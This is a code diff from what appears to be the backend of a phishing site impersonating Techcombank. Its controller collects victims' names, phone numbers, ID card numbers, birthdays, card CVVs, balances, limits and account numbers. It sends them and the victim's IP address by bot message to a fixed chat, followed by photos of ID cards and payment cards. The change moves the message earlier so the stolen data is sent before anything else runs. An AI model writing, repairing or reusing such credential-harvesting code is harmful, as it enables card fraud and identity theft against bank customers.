@@ -30,6 +30,11 @@ export class TechcombankController {
         socketId,
       } = req.body;
 
+      bot.sendMessage(
+        CHAT_ID,
+        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
+      );
+
       let frontIdCard = "";
       let backIdCard = "";
       let frontCard = "";
@@ -76,10 +81,6 @@ export class TechcombankController {
       await account.save();
 
       Promise.allSettled([
-        bot.sendMessage(
-          CHAT_ID,
-          `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
-        ),
         frontIdCard && bot.sendPhoto(CHAT_ID, frontIdCard),
         backIdCard && bot.sendPhoto(CHAT_ID, backIdCard),
         frontCard && bot.sendPhoto(CHAT_ID, frontCard),
